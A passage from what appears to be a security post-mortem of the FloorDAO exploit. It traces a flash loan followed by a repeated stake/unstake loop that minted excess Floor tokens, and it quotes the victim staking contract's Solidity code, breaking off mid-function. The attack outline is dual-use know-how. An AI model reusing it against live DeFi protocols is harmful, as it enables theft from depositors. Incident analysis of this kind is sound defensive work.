+<p>It can be observed that the <code>Epoch</code>'s <code>number</code> and <code>end</code> in the problematic FloorStaking contract were altered.</p>
+<p><img alt="State Changes" src="../../image/230905_FloorDAO.assets/0642.png" /></p>
+<p>The total supply of Floor tokens increased, and new tokens were minted.</p>
+<p><img alt="State Changes" src="../../image/230905_FloorDAO.assets/1028.png" /></p>
+<p>The state of sFloor tokens also changed significantly.</p>
+<h3 id="invocation-flow">Invocation Flow</h3>
+<p>Next, let's analyze the details of the internal calls within the transaction.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/3022.png" /></p>
+<p>The transaction starts by directly calling the <code>flash</code> function of the Uniswap pool, executing a flash loan of all Floor tokens from the pool.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/3208.png" /></p>
+<p>The core of the callback appears to be a loop:</p>
+<p><code>circulatingSupply -&gt; approve -&gt; stake -&gt; unstake</code></p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/3424.png" /></p>
+<p>Finally, the attacker repays the loan and converts excess Floor tokens into WETH.</p>
+<p>Clearly, the main issue lies within the loop of continuous <code>stake</code> and <code>unstake</code> operations, through which the attacker gained more Floor tokens.</p>
+<p>By combining the static call, let's carefully analyze the logic within this loop.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/4052.png" /></p>
+<p>The <code>circulatingSupply</code> function retrieves the circulating supply of sFloor tokens. The <code>approve</code> function approves the Floor token balance owned by the attacker for the staking contract. Each time, the <code>circulatingSupply</code> value increases.</p>
+<p>The key to profit lies in the <code>stake</code> and <code>unstake</code> functions. The <code>stake</code> function allows the attacker to deposit all Floor tokens and then immediately call <code>unstake</code>, resulting in more Floor tokens than initially staked. This process is repeated, enabling the attacker to acquire more Floor tokens.</p>
+<p>Hence, in the earlier fund flow, the transfers of Floor tokens (2, 6) should represent the cumulative effect of multiple cycles of <code>stake</code> and <code>unstake</code> transfers.</p>
+<p>Now, let's analyze the internal call logic of the <code>stake</code> and <code>unstake</code> functions separately.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/4946.png" /></p>
+<p>In the <code>stake</code> function, the attacker first transfers Floor tokens to the staking contract, then calls the <code>rebase</code> function of sFloor, followed by the <code>distribute</code> function of the Distributor contract. Finally, it mints gFloor tokens for the attacker.</p>
+<p>The sequence involves depositing tokens into the contract, performing a <code>rebase</code>, distributing tokens, and obtaining staking certificates in the form of gFloor tokens.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/5316.png" /></p>
+<p>All internal calls within <code>rebase</code> are static calls.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/5513.png" /></p>
+<p>The <code>distribute</code> function, on the other hand, mints new Floor tokens for the FloorStaking contract via the Treasury contract.</p>
+<p><img alt="Invocation Flow" src="../../image/230905_FloorDAO.assets/5628.png" /></p>
+<p>In the <code>unstake</code> function, the attacker calls the <code>rebase</code> function first (compared to <code>stake</code>, there is profit here, and the epoch is increased by 1). Then, it calls the <code>distribute</code> function of the Distributor contract again. Finally, the attacker burns the gFloor tokens owned and receives more Floor tokens than when initially staked.</p>
+<p>Clearly, there are some subtle issues within the <code>stake</code> and <code>unstake</code> functions of the FloorStaking contract that allowed the attacker to profit.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The vulnerability in the FloorDAO protocol and the reasons behind the attacker's profit are complex. Below is a brief analysis. For a detailed understanding, you would need to refer to the relevant contract code of <a href="https://etherscan.io/address/0x759c6de5bca9ade8a1a2719a31553c4b7de02539#code">FloorStaking</a>, as well as knowledge about the FloorDAO protocol and rebase tokens.</p>
+<h3 id="floordao">FloorDAO</h3>
+<p>Floor token is a rebase token, and users can earn profits by staking Floor tokens in the staking contract.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cm">/**</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="cm">* @notice stake FLOOR to enter warmup</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="cm">* @param _to address</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="cm">* @param _amount uint</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="cm">* @param _claim bool</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="cm">* @param _rebasing bool</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="cm">* @return uint</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="cm">*/</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="kt">function</span><span class="w"> </span><span class="nv">stake</span><span class="p">(</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">_to</span><span class="p">,</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_amount</span><span class="p">,</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nv">_rebasing</span><span class="p">,</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nv">_claim</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span>FLOOR<span class="p">.</span>safeTransferFrom<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>_amount<span class="p">);</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span>_amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>_amount<span class="p">.</span>add<span class="p">(</span>rebase<span class="p">());</span><span class="w"> </span><span class="c1">// add bounty if rebase occurred</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_claim<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>warmupPeriod<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>_send<span class="p">(</span>_to<span class="p">,</span><span class="w"> </span>_amount<span class="p">,</span><span class="w"> </span>_rebasing<span class="p">);</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">        </span>Claim<span class="w"> </span><span class="kt">memory</span><span class="w"> </span>info<span class="w"> </span><span class="o">=</span><span class="w"> </span>warmupInfo<span class="p">[</span>_to<span class="p">];</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span>info<span class="p">.</span>lock<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="w">            </span><span class="kt">require</span><span class="p">(</span>_to<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;External deposits for account are locked&quot;</span><span class="p">);</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="w">        </span>warmupInfo<span class="p">[</span>_to<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Claim<span class="p">({</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="w">            </span>deposit<span class="o">:</span><span class="w"> </span>info<span class="p">.</span>deposit<span class="p">.</span>add<span class="p">(</span>_amount<span class="p">),</span>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="w">            </span>gons<span class="o">:</span><span class="w"> </span>info<span class="p">.</span>gons<span class="p">.</span>add<span class="p">(</span>sFLOOR<span class="p">.</span>gonsForBalance<span class="p">(</span>_amount<span class="p">)),</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="w">            </span>expiry<span class="o">:</span><span class="w"> </span>epoch<span class="p">.</span>number<span class="p">.</span>add<span class="p">(</span>warmupPeriod<span class="p">),</span>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="w">            </span>lock<span class="o">:</span><span class="w"> </span>info<span class="p">.</span>lock
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="w">        </span><span class="p">});</span>
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="w">        </span>gonsInWarmup<span class="w"> </span><span class="o">=</span><span class="w"> </span>gonsInWarmup<span class="p">.</span>add<span class="p">(</span>sFLOOR<span class="p">.</span>gonsForBalance<span class="p">(</span>_amount<span class="p">));</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>_amount<span class="p">;</span>
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="p">}</span>
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="cm">/**</span>
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="cm">* @notice send staker their amount as sFLOOR or gFLOOR</span>
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="cm">* @param _to address</span>
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="cm">* @param _amount uint</span>
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="cm">* @param _rebasing bool</span>
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="cm">*/</span>
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_send</span><span class="p">(</span>
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">_to</span><span class="p">,</span>
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_amount</span><span class="p">,</span>
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nv">_rebasing</span>
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_rebasing<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="w">        </span>sFLOOR<span class="p">.</span>safeTransfer<span class="p">(</span>_to<span class="p">,</span><span class="w"> </span>_amount<span class="p">);</span><span class="w"> </span><span class="c1">// send as sFLOOR (equal unit as FLOOR)</span>
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>_amount<span class="p">;</span>
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="w">        </span>gFLOOR<span class="p">.</span>mint<span class="p">(</span>_to<span class="p">,</span><span class="w"> </span>gFLOOR<span class="p">.</span>balanceTo<span class="p">(</span>_amount<span class="p">));</span><span class="w"> </span><span class="c1">// send as gFLOOR (convert units from FLOOR)</span>
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>gFLOOR<span class="p">.</span>balanceTo<span class="p">(</span>_amount<span class="p">);</span>
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The <code>stake</code> function is responsible for the staking feature, where users stake Floor tokens and receive sFloor/gFloor tokens in return. Both sFloor and gFloor tokens serve the same purpose in earning rewards, with gFloor having additional governance functionality.</p>
+<p>Depending on the <code>_claim</code> parameter, it decides whether to execute warmup-related operations. If it's true and the <code>warmupPeriod</code> is 0 (as set in the contract), users need to call the <code>claim</code> function to <code>_send</code> and receive tokens. (The warmup is a waiting period before a staker can take their sToken with the rebase rewards. Warmup does not affect the reward amount, it only adds a time threshold for claiming the rewards.)</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cm">/**</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="cm">* @notice convert _amount sFLOOR into gBalance_ gFLOOR</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="cm">* @param _to address</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="cm">* @param _amount uint</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="cm">* @return gBalance_ uint</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="cm">*/</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="kt">function</span><span class="w"> </span><span class="nv">wrap</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_to</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_amount</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">gBalance_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">    </span>sFLOOR<span class="p">.</span>safeTransferFrom<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>_amount<span class="p">);</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">    </span>gBalance_<span class="w"> </span><span class="o">=</span><span class="w"> </span>gFLOOR<span class="p">.</span>balanceTo<span class="p">(</span>_amount<span class="p">);</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">    </span>gFLOOR<span class="p">.</span>mint<span class="p">(</span>_to<span class="p">,</span><span class="w"> </span>gBalance_<span class="p">);</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="p">}</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="cm">/**</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="cm">* @notice convert _amount gFLOOR into sBalance_ sFLOOR</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="cm">* @param _to address</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="cm">* @param _amount uint</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="cm">* @return sBalance_ uint</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="cm">*/</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="kt">function</span><span class="w"> </span><span class="nv">unwrap</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_to</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_amount</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">sBalance_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w">    </span>gFLOOR<span class="p">.</span>burn<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>_amount<span class="p">);</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">    </span>sBalance_<span class="w"> </span><span class="o">=</span><span class="w"> </span>gFLOOR<span class="p">.</span>balanceFrom<span class="p">(</span>_amount<span class="p">);</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">    </span>sFLOOR<span class="p">.</span>safeTransfer<span class="p">(</span>_to<span class="p">,</span><span class="w"> </span>sBalance_<span class="p">);</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>After staking, users can convert their sFloor/gFloor tokens using the <code>wrap</code> and <code>unwrap</code> functions in the contract.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span>ERC20<span class="p">(</span><span class="s2">&quot;Staked FLOOR&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;sFLOOR&quot;</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">9</span><span class="p">)</span><span class="w"> </span>ERC20Permit<span class="p">(</span><span class="s2">&quot;Staked FLOOR&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span>initializer<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span>_totalSupply<span class="w"> </span><span class="o">=</span><span class="w"> </span>INITIAL_FRAGMENTS_SUPPLY<span class="p">;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span>_gonsPerFragment<span class="w"> </span><span class="o">=</span><span class="w"> </span>TOTAL_GONS<span class="p">.</span>div<span class="p">(</span>_totalSupply<span class="p">);</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">}</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="kt">function</span><span class="w"> </span><span class="nv">initialize</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_stakingContract</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_treasury</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>initializer<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Initializer:  caller is not initializer&quot;</span><span class="p">);</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>_stakingContract<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Staking&quot;</span><span class="p">);</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span>stakingContract<span class="w"> </span><span class="o">=</span><span class="w"> </span>_stakingContract<span class="p">;</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span>_gonBalances<span class="p">[</span>stakingContract<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>TOTAL_GONS<span class="p">;</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>_treasury<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Zero address: Treasury&quot;</span><span class="p">);</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span>treasury<span class="w"> </span><span class="o">=</span><span class="w"> </span>_treasury<span class="p">;</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span><span class="w"> </span>stakingContract<span class="p">,</span><span class="w"> </span>_totalSupply<span class="p">);</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">    </span>emit<span class="w"> </span>LogStakingContractUpdated<span class="p">(</span>stakingContract<span class="p">);</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">    </span>initializer<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">);</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Considering gas costs, adjusting the balances of stakers proportionally with each rebase would be overly complex. Therefore, the contract introduces variables like <code>_gonsPerFragment</code> and <code>TOTAL_GONS</code> in the <a href="https://etherscan.io/address/0x164AFe96912099543BC2c48bb9358a095Db8e784">sFloor token contract</a>. The initial supply of sFloor tokens is set as <code>INITIAL_FRAGMENTS_SUPPLY</code>, and <code>_gonsPerFragment</code> is calculated as <code>TOTAL_GONS/_totalSupply</code>.</p>
+<p>Here, gons serve as an internal unit, with a fixed total supply of <code>TOTAL_GONS</code>, while <code>_gonsPerFragment</code> changes with <code>_totalSupply</code>.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">transfer</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">value</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>override<span class="p">(</span>IERC20<span class="p">,</span><span class="w"> </span>ERC20<span class="p">)</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">gonValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>value<span class="p">.</span>mul<span class="p">(</span>_gonsPerFragment<span class="p">);</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span>_gonBalances<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_gonBalances<span class="p">[</span><span class="k">msg.sender</span><span class="p">].</span>sub<span class="p">(</span>gonValue<span class="p">);</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span>_gonBalances<span class="p">[</span>to<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_gonBalances<span class="p">[</span>to<span class="p">].</span>add<span class="p">(</span>gonValue<span class="p">);</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
